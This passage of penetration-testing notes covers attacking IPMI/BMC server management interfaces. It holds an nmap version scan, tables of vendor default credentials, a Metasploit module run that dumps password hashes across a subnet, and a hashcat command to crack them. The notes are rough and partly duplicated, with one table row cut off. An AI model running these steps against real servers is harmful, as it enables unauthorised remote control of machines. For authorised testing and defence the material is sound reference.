hardware monitoring protocol
- Danger: attacker can power off, reboot, or control server BIOS remotely.
### EXPLOITS
If default credentials do not work to access a BMC, we can turn to a [flaw] in IPMI 2.0.
that allows retrieving all users password hashes


### Footprinting

Check version:
```

sudo nmap -sU -p 623 --script ipmi-version <IP>
```


Default credentials:

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|


|Product Name|Default Username|Default Password|
|---|---|---|
|**HP Integrated Lights Out (iLO)**|Administrator|<factory randomized 8-character string>|
|**Dell Remote Access Card (iDRAC, DRAC)**|root|calvin|
|**IBM Integrated Management Module (IMM)**|USERID|PASSW0RD (with a zero)|
|**Fujitsu Integrated Remote Management Controller**|admin|admin|
|**Supermicro IPMI (2.0)**|ADMIN|ADMIN|
|**Oracle/Sun Integrated Lights Out Manager (ILOM)**|root|changeme|
|**ASUS iKVM BMC**|
### IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval
```

msf> use auxiliary/scanner/ipmi/ipmi_dumphashes**
set rhosts 10.0.0.0/24
set THREADS 256
#set OUTPUT_JOHN_FILE out.john
#set OUTPUT_HASHCAT_FILE out.hashcat
run
```
https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/

### crack retrieved hashes
`hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`